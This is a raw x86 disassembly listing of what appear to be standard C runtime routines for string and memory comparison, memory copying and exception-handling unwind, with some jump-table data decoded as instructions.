  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
